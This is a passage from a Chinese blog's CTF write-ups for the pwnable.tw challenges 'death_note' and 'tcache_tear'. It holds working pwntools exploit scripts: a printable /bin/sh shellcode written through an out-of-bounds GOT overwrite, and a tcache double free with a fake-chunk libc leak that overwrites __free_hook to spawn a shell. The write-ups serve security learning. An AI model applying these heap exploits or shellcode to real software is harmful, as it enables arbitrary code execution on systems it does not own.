id=\"overviewampreverse\">overview&amp;reverse</span></h1><p>​        </p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-11%20%E4%B8%8B%E5%8D%886.53.26.png\" alt=\"截屏2022-05-11 下午6.53.26\"></p>\n<p>​    比较明显是一道堆上的shellcode，程序逻辑比较简单,就是以idx创建不同的note，然后每个note只储存name，没有结构体啥的，Name，也就是我们输入进堆块的数据，必须是可见字符。之前做过一道类似的题，也是一个可见字符shellcode，可以用专门的工具或者嗯写出对应的可见字符版本的shellcode。</p>\n<h1><span id=\"利用\">利用</span></h1><p>​        这里getshell的直接步骤毋庸置疑是执行shellcode的了。但是对于堆中的shellcode执行来说我能想到的思路只有：</p>\n<ol>\n<li><p>改hook为shellcode地址（要求leak heap，libc）</p>\n</li>\n<li><p>改got为shellcode地址（要求leak heap，libc）</p>\n</li>\n<li><p>直接控制执行流为shellcode地址（这里不好实现）</p>\n</li>\n</ol>\n<p>​        我们暂时思考第二种方式。关于修改malloc hook为shellcode，需要考虑的思路有两种，第一是先leak libc，通过fastbin dup将chunk直接分配到malloc hook上，然后在chunk中输入shellcode。第二是在普通的用户heap段输入shellcode，然后leak heap，再leak libc，然后fastbin dup将hook改为shellcode地址。这里其实也可以将shellcode输入到任意可控地址，因为都是需要dup然后改malloc的，具体值其实无所谓了。</p>\n<p>​        所以两种方法唯一的差别就是一个heap leak，程序是否有leak heap 的可能,</p>\n<p>​        注意到我们最多只能在name中输入0x50个字符，并且chunk的大小是根据我们输入的字符创建的，所以说这里我们最多只能创建0x50大小的chunk，所以unsorted bin leak将变得困难。我们需要另辟蹊径。</p>\n<p>​        分析leak，关注点首先应该放在打印函数比如这里的<code>show_note</code>，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Name : %s\\n&quot;</span>, (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)*(&amp;note + v1));</span><br></pre></td></tr></table></figure>\n<p>​        格式化字符串打印，但是因为size位的空字节太多，而且这道题应该也咩有堆溢出，所以光靠空字节覆盖肯定行不通。应该还是通过double free制造uaf来打印chunk 的fd和bk，但是这里没有办法申请unsorted bin的话就没有办法leak libc，最多也就是leak heap。    </p>\n<p>​        怎么构造都没有办法利用，调得困得睡了一觉，起来以后还是没有思路，于是去看了wp，发现是逆向看漏了idx的范围判断。这里可以越界向bss的低地址写，note的可写低地址正好包含got表，这样就非常简单了，首先越界覆盖got为shellcide，然后再读入shellcode了。</p>\n<p>​        这里是真的要反省，idx范围为负导致的越界读写，这个漏洞我已经不是第一次碰了，而且本身也非常简单易懂，也很好看出来，第一次我没有看出来情有可缘，第二次就不应该了。</p>\n<h2><span id=\"越界写覆盖puts-got\">越界写覆盖puts got</span></h2><p>​        算好note与puts got的偏移，然后覆盖成shellcode，note是<code>0x804A060</code>,got是<code>0x804A020</code>,所以idx是0x14，也就是-20，测试一下。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-11%20%E4%B8%8B%E5%8D%888.20.09.png\" alt=\"截屏2022-05-11 下午8.20.09\"></p>\n<h2><span id=\"可见shellcode生成\">可见shellcode生成</span></h2><p>​        这里可以试一下<a href=\"https://github.com/TaQini/alpha3.git这个工具\">https://github.com/TaQini/alpha3.git这个工具</a></p>\n<p>​        首先生成对应架构的shellcode</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sc = shellcraft.i386.linux.sh()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(asm(sc))</span><br></pre></td></tr></table></figure>\n<p>​        将shellcode输出到shellcode文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 1.py &gt; shellcode</span><br></pre></td></tr></table></figure>\n<p>​        然后生成可见字符的shellcode</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">python ./ALPHA3.py x86 <span class=\"built_in\">ascii</span> mixedcase eax --<span class=\"built_in\">input</span>=<span class=\"string\">&quot;shellcode&quot;</span> &gt; out.<span class=\"built_in\">bin</span></span><br></pre></td></tr></table></figure>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-11%20%E4%B8%8B%E5%8D%888.49.09.png\" alt=\"截屏2022-05-11 下午8.49.09\"></p>\n<p>​        然发现这里的字符已经超出了0x50，一共238个字符，显然不行。</p>\n<p>​        所以去copy了一个</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">p = process([<span class=\"string\">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./death_note&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;chall.pwnable.tw&#x27;,10201)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">idx,data</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Name :&quot;</span>)</span><br><span class=\"line\">\tp.sendline(data)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = <span class=\"string\">&#x27;jhh///sh/binT[RXh````Z(P5(P5(P4h&gt;&gt;&gt;&gt;Z(P4QZRX4@4KRZRZk@&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(-<span class=\"number\">16</span>,shellcode)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>python ./ALPHA3.py x64 ascii mixedcase rax —input=”shellcode”</p>\n","categories":["Binary_security"],"tags":["STACK - ret2shellcode"]},{"title":"pwnable - teacher_tear","url":"/2022/05/13/week11_5_pwnable_teacher_tear/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-zJfhlJFj\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"overview\">overview</span></h1><p>​        除了pie其他都开，这样就不能修改got表了。</p>\n<p>​        libc是2.27，需要考虑的就是tcache，</p>\n<h1><span id=\"reverse\">reverse</span></h1><p>​        这道题的逻辑也比较简单，堆块的分配给我的感觉是比较类似21年ciscn的lonelywolf，也是只能申请一个chunk，然后free处直接free整个malloc出的ptr，info则是打印我们输入的name。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Name :&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> write(<span class=\"number\">1</span>, &amp;name_addr, <span class=\"number\">0x20</span>uLL);</span><br></pre></td></tr></table></figure>\n<p>​            本来如果能无限制write的话只要把name填满之类就可以leak一个heap了，但是这里只能打印0x20个字符。包括之前输入的时候也是，程序并不给我们溢出的机会。但是直觉告诉我这里肯定有可以利用的点。</p>\n<h1><span id=\"利用\">利用</span></h1><p>​        【依旧依旧依旧是杂乱的做题笔记，思路比较跳跃，写的大概率也懒得改了（除非错得离谱）】</p>\n<p>​        目前想的几种思路都碰壁了，首先这道题肯定还是要改hook，那就需要leak libc，这里应该就是unsorted bin leak，但是tcache 阻碍了我们申请。所以这道题，面对处理tcache，肯定不能多次申请，所以首先想到的办法就是破坏tcache的管理堆，但是这里tcache dup并不好实现，由于程序并没有给我们提供类似edit的功能，以至于我们没有办法此非常好地利用free 中的uaf。此外程序的name以及*ptr模块的利用也不容乐观，虽然name和ptr紧密接壤，但是程序并没有提供给我们任意的字节溢出以至于我只能束手无策。</p>\n<p>​        又想了一下，这道题估计要排堆。但是感觉也没有特别好的思路，这里构造double free肯定不好使。不会是我本机libc的问题吧，我这里tcache bin是不能double free的，但是按道理经典的libc2.27就是可以的。</p>\n<p>​        可以试一下。</p>\n<p>​        。。还真是我自己的libc的问题，题目给的libc是可以double free的，但是又要制作符号表。懒得制作了，直接看地址，反正没有pie。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name:&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">32</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x50</span>)</span><br><span class=\"line\">free()<span class=\"comment\">#tcache =&gt; chunk1 </span></span><br><span class=\"line\">free()<span class=\"comment\">#tcache =&gt; chunk1 =&gt; chunk1 </span></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,p64(tcache_struct)*<span class=\"number\">2</span>) <span class=\"comment\">#chunk1</span></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,p64(tcache_struct)*<span class=\"number\">2</span>) <span class=\"comment\">#chunk1</span></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x50</span>)</span><br></pre></td></tr></table></figure>\n<p>​        这样double free就能快速实现tcache dup，然后破坏结构体。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-13%20%E4%B8%8B%E5%8D%8810.39.27.png\" alt=\"截屏2022-05-13 下午10.39.27\"></p>\n<p>​        破坏结构体以后我自己第一想法是直接申请unsorted bin 来leak libc，其实这道题的思路已经非常清晰了，就是通过一个tcache的double free来进行dup，从而实现任意地址写。</p>\n<p>​        所以我们首先还是需要知道目标地址的值，这里还是有一个不知道怎么利用的地方，就是这个name。然而当我迫不及待地申请一个small bin的时候，程序直接卡了。</p>\n<p>​    <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8A%E5%8D%8810.05.07.png\" alt=\"截屏2022-05-14 上午10.05.07\"></p>\n<p>​        很烦，有没有烈士写过那种的工具。浅浅搜索了一下并没有看到，之前很有名的glibc-all-in-one我感觉也就是一个批量下载glibc的小工具。有时间可以自己写一下。flag又多了一项（</p>\n<p>​        这里我还是忍痛手工搞了一个带调试符号的。这里提一嘴，网上流传比较广的objcopy实则并不好用，如果在这里有问题可以看一看胖爷爷的看雪处女著作，写得很好，很有精神。概括总结就是eu- stripped很好用。谢谢胖爷爷，让我又白嫖了。</p>\n<p>​        <a href=\"https://bbs.pediy.com/thread-271926.htm\">https://bbs.pediy.com/thread-271926.htm</a></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8A%E5%8D%8810.42.48.png\" alt=\"截屏2022-05-14 上午10.42.48\"></p>\n<p>​        可以看到经过我们破坏tcache已经变得十分惨烈。</p>\n<p>​        但是这之后应该怎么利用呢？</p>\n<p>​        又出现了一个很奇怪的问题。这里：</p>\n<p>​        </p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8A%E5%8D%8811.09.31.png\" alt=\"截屏2022-05-14 上午11.09.31\"></p>\n<p>​        如果此时我free的话，按道理就是free0x603000这个指针，也就是整个管理chunk，此时它应该作为一个unsorted bin，但是这里如果free，就会有诡异的事情发生。</p>\n<p>​        我觉得我应该换一个思考方向，比如直接dup到bss段修改name或者ptr。。</p>\n<p>​        这个题，，name的地方怎么处理，整个题除了这个地方，其他没有任何leak，我们现在只有一个漫无目的的任意地址写，写哪里写什么都需要leak。</p>\n<p>​        突然意识到这里如果我们能够在name上面伪造一个unsorted bin大小的fake chunk，然后再将它free的话，我们就可以通过info将其打印出来，这样一切都说得通了。</p>\n<p>​        于是我是这样构造的：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">fake_chunk = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x411</span>) + <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x602070</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,fake_chunk)</span><br><span class=\"line\">free()<span class=\"comment\">#add(0x40,b&#x27;a&#x27;*0x40)</span></span><br></pre></td></tr></table></figure>\n<p>​        不幸的是，这里还是被放进了tcache，大概是又考虑了一些检测吧。到这里确实只差临门一脚了，然而排堆确实不是我擅长的部分，所以我去参考了wp。</p>\n<p>​    <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8A%E5%8D%8811.59.06.png\" alt=\"截屏2022-05-14 上午11.59.06\"></p>\n<p>​        大概就是我们伪造对chunk的相邻chunk的prev inused位必须为1，这样才能正常free到unsorted bin。而这里的“相邻chunk“指的就是name + size的地址处的chunk，比如说如果我在name处伪造的chunk size为0x410，那么&amp;name + 0x410处的地址必须是一个prev inused位为1的堆块。</p>\n<p>​        且由于free函数还对nextchunk的prev inuse进行了检查，所以next的next也需要是一个prev inuse为1的chunk。</p>\n<p>​        也就是说我们需要伪造三个chunk，第一个是用来放入unsorted bin中的，size为0x410的chunk，后面两个就是比较简单的inuse位为1的两个chunk，但是之类不太好处理的就是地址问题。</p>\n<p>​        程序申请的heap段大概从0x603000开始，name在<code>0x602060</code>，要达到<code>0x603000</code>是不太可能了。所以这里还要再利用一次tcache dup，在<code>&amp;name + size</code>的地方也构造fake chunk。</p>\n<p>​        这里暂时将fake unsorted bin的size定为0x410，所以第二个fake chunk的地址为<code>0x602470</code>。</p>\n<p>​        调试以后发现0x410大小的size还是会被放在tcahce中，所以索性将size改为了0x500，然后就能成功拿到libc了，这里也验证了之前的问题，其实之前也是0x410能够成功执行，但是bin会被放在tcache中，然后如果申请比这个size更大的值的话程序就会报错退出，就是没有通过检测，这里我们构造fake chunk绕过检测之后就能够成功将bin放入unsorted bin。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%881.30.08.png\" alt=\"截屏2022-05-14 下午1.30.08\">         </p>\n<p>​        这一部分的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">tcache_struct = <span class=\"number\">0x603000</span></span><br><span class=\"line\">name_addr = <span class=\"number\">0x602060</span></span><br><span class=\"line\">ptr_addr = <span class=\"number\">0x602088</span></span><br><span class=\"line\">size = <span class=\"number\">0x500</span></span><br><span class=\"line\">target_addr = name_addr + size</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name:&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">32</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\">free()<span class=\"comment\">#tcache =&gt; chunk1 </span></span><br><span class=\"line\">free()<span class=\"comment\">#tcache =&gt; chunk1 =&gt; chunk1 </span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,p64(target_addr)*<span class=\"number\">2</span>) <span class=\"comment\">#chunk1</span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,p64(target_addr)*<span class=\"number\">2</span>) <span class=\"comment\">#chunk1</span></span><br><span class=\"line\">fake_chunk = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x21</span>) + <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x10</span> </span><br><span class=\"line\">fake_chunk += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x21</span>) + <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x10</span> </span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,fake_chunk)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x30</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x30</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x30</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,p64(name_addr)*<span class=\"number\">2</span>) <span class=\"comment\">#chunk1</span></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,p64(name_addr)*<span class=\"number\">2</span>) <span class=\"comment\">#chunk1</span></span><br><span class=\"line\">fake_chunk = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x501</span>) + <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x602070</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,fake_chunk)</span><br><span class=\"line\">free()</span><br><span class=\"line\">info()</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name :&quot;</span>)</span><br><span class=\"line\">main_arena = u64(p.recv()[<span class=\"number\">16</span>:<span class=\"number\">24</span>]) -<span class=\"number\">96</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;main_arena =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(main_arena)))</span><br><span class=\"line\">malloc_hook = main_arena + <span class=\"number\">0x10</span></span><br><span class=\"line\">libc_base = malloc_hook  - libc.symbols[<span class=\"string\">&quot;__malloc_hook&quot;</span>]</span><br><span class=\"line\">one_gadget = libc_base + <span class=\"number\">0x4f2c5</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libc_base)))</span><br><span class=\"line\"><span class=\"comment\">#0x4f322</span></span><br><span class=\"line\"><span class=\"comment\">#0x10a38c</span></span><br></pre></td></tr></table></figure>\n<p>​        拿到libc以后再进行任意地址写，然而又卡死了。非常诡异，如果去接受了那个地址的话就会卡死，但是如果直接拿值来任意地址写的话就能成功改写。</p>\n<p>​        搞不懂啊，大概又是什么接收的问题把，所以我把后面的add的your choise删掉就可以了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./tcache_tear&quot;)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./tcache_tear&quot;</span>,env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;./libc-2.27.so&quot;</span>&#125;)</span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;chall.pwnable.tw&quot;</span>,<span class=\"number\">10207</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so&quot;</span>)</span><br><span class=\"line\">tcache_struct = <span class=\"number\">0x603000</span></span><br><span class=\"line\">name_addr = <span class=\"number\">0x602060</span></span><br><span class=\"line\">ptr_addr = <span class=\"number\">0x602088</span></span><br><span class=\"line\">size = <span class=\"number\">0x500</span></span><br><span class=\"line\">target_addr = name_addr + size</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size,data</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Size:&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Data:&quot;</span>)</span><br><span class=\"line\">\tp.sendline(data)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add2</span>(<span class=\"params\">size,data</span>):</span></span><br><span class=\"line\">\t<span class=\"comment\">#p.recvuntil(&quot;Your choice :&quot;)</span></span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\t<span class=\"comment\">#p.recvuntil(&quot;Size:&quot;)</span></span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"><span class=\"comment\">#\tp.recvuntil(&quot;Data:&quot;)</span></span><br><span class=\"line\">\tp.sendline(data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>():</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free2</span>():</span></span><br><span class=\"line\">\t<span class=\"comment\">#p.recvuntil(&quot;Your choice :&quot;)</span></span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">info</span>():</span></span><br><span class=\"line\">\t<span class=\"comment\">#p.recvuntil(&quot;Your choice :&quot;)</span></span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name:&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">32</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\">free()<span class=\"comment\">#tcache =&gt; chunk1 </span></span><br><span class=\"line\">free()<span class=\"comment\">#tcache =&gt; chunk1 =&gt; chunk1 </span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,p64(target_addr)*<span class=\"number\">2</span>) <span class=\"comment\">#chunk1</span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,p64(target_addr)*<span class=\"number\">2</span>) <span class=\"comment\">#chunk1</span></span><br><span class=\"line\">fake_chunk = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x21</span>) + <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x10</span> </span><br><span class=\"line\">fake_chunk += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x21</span>) + <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x10</span> </span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,fake_chunk)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x30</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x30</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x30</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,p64(name_addr)*<span class=\"number\">2</span>) <span class=\"comment\">#chunk1</span></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,p64(name_addr)*<span class=\"number\">2</span>) <span class=\"comment\">#chunk1</span></span><br><span class=\"line\">fake_chunk = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x501</span>) + <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x602070</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,fake_chunk)</span><br><span class=\"line\">free()</span><br><span class=\"line\">info()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name :&quot;</span>)</span><br><span class=\"line\">main_arena = u64(p.recv()[<span class=\"number\">16</span>:<span class=\"number\">24</span>]) -<span class=\"number\">96</span></span><br><span class=\"line\"><span class=\"comment\">#main_arena =  0x7ffff7dcdc40</span></span><br><span class=\"line\"><span class=\"comment\">#libc_base = 0x7ffff79e2000</span></span><br><span class=\"line\">malloc_hook = main_arena - <span class=\"number\">0x10</span></span><br><span class=\"line\">libc_base = malloc_hook  - libc.symbols[<span class=\"string\">&quot;__malloc_hook&quot;</span>]</span><br><span class=\"line\">one_gadget = libc_base + <span class=\"number\">0x4f2c5</span></span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">free_hook = libc_base + libc.symbols[<span class=\"string\">&#x27;__free_hook&#x27;</span>]<span class=\"comment\">#0x7ffff7dcf8e8</span></span><br><span class=\"line\"></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libc_base)))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(system_addr)))<span class=\"comment\"># 0x7ffff7a31440 </span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;free_hook =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(free_hook)))</span><br><span class=\"line\"></span><br><span class=\"line\">add2(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free2()</span><br><span class=\"line\">free2()</span><br><span class=\"line\">add2(<span class=\"number\">0x20</span>,p64(free_hook)*<span class=\"number\">2</span>) <span class=\"comment\">#chunk1</span></span><br><span class=\"line\">add2(<span class=\"number\">0x20</span>,p64(free_hook)*<span class=\"number\">2</span>) <span class=\"comment\">#chunk1</span></span><br><span class=\"line\">add2(<span class=\"number\">0x20</span>,p64(system_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">add2(<span class=\"number\">0x60</span>,<span class=\"string\">b&quot;/bin/sh&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%882.28.08.png\" alt=\"截屏2022-05-14 下午2.28.08\"></p>\n<h2><span id=\"需要注意的问题\">需要注意的问题</span></h2><p>​        之前也一直碰到这个问题，就是有时有感觉没有任何问题，但是程序就是会异常卡死，如果不是exp逻辑有问题那么大概率就是那个传输模块的<code>p.recv</code>的锅，exp想让我们接受这个数据，但是实际上这个数据已经接受过了，所以就会陷入死循环，这个时候只需要把类似的语句注释掉就好。</p>\n<p>​        其次这个题实际上就是一个tcache dup+house of spirit，整个题做了三个半小时左右，没有什么难度。唯一值得注意的就是free unsorted 